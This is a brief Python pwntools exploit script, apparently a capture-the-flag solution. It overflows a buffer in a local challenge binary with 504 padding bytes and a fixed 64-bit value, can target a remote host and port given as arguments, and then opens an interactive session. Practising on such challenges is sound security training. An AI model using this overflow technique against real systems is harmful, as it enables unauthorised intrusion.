from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript='''
'''.format(**locals())

exe = "./pwnable"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.terminal = 'kitty'

offset = 504

io = start()

payload = b"A" * offset + p64(0xdeadb19b00b5dead)

io.sendline(payload)

io.interactive()
